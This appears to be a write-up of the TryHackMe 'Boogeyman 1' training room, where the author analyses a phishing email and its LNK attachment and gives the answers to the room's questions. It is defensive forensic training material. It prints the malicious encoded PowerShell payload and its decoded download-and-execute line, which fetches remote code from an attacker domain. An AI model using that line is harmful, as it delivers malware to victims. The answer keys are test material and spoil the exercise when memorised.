The room provided a phishing email, endpoint logs, and network traffic to analyze. By studying email headers, parsing JSON logs with JQ, and reconstructing events from packet captures, I uncovered how the threat actor gained initial access, enumerated the host, exfiltrated data, and maintained persistence.

Key learning included inspecting encoded payloads, tracking command execution in logs, and carving exfiltrated content from DNS traffic.

Room link: https://tryhackme.com/room/boogeyman1


**Task 1 [Introduction] New threat in town.**

***Uncover the secrets of the new emerging threat, the Boogeyman.***

In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.

![image](images/boogeyman-door.png)

Investigation Platform

Before we proceed, deploy the attached machine by clicking the Start Machine button in the upper-right-hand corner of the task. It may take up to 3–5 minutes to initialise the services.

The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

Artefacts

For the investigation proper, you will be provided with the following artefacts:

  - Copy of the phishing email (dump.eml)
  - Powershell Logs from Julianne’s workstation (powershell.json)
  - Packet capture from the same workstation (capture.pcapng)

***Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the evtx2json tool.***

You may find these files in the /home/ubuntu/Desktop/artefacts directory.

Tools

The provided VM contains the following tools at your disposal:

  - Thunderbird — a free and open-source cross-platform email client.
  - LNKParse3 — a python package for forensics of a binary file with LNK extension.
  - Wireshark — GUI-based packet analyser.
  - Tshark — CLI-based Wireshark.
  - jq — a lightweight and flexible command-line JSON processor.

To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:

  - grep
  - sed
  - awk
  - base64

Now, let’s start hunting the Boogeyman!

Answer the questions below

Let’s hunt that boogeyman!


**Task 2 [Email Analysis] Look at that headers!**

**The Boogeyman is here!**

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

![image](images/phishing1.png)

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

**Investigation Guide**

Given the initial information, we know that the compromise started with a phishing email. Let’s start with analysing the **dump.eml** file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:

  - The manual way uses command-line tools such as cat, grep, base64, and sed. Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.

`cat *PAYLOAD FILE* | base64 -d > Invoice.zip`

  - An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.

![image](images/task2-1.png)

![image](images/task2-2.png)

![image](images/task2-3.png)

![image](images/task2-4.png)

Once the payload from the encrypted archive is extracted, use lnkparse to extract the information inside the payload.

`lnkparse *LNK FILE*`

**Answer the questions below**

**What is the email address used to send the phishing email?**

***Answer: agriffin@bpakcaging.xyz***

Refer to the email header from above.

**What is the email address of the victim?**

***Answer: julianne.westcott@hotmail.com***

We can copy the content of the email header and use online tool to analyze the content. Here I used https://mha.azurewebsites.net/

![image](images/task2-5.png)

**What is the name of the file inside the encrypted attachment?**

***Answer: Invoice_20230103.lnk***

**What is the password of the encrypted attachment?**

***Answer: Invoice2023!***

**Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?**

***Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==***

Parse the the malicious file using the tool mentioned.

![image](images/task2-6.png)

![image](images/task2-8.png)

Decode the strings in cyberchef.

![image](images/task2-7.png)

iex (new-object net.webclient).downloadstring(‘http://files.bpakcaging.xyz/update')














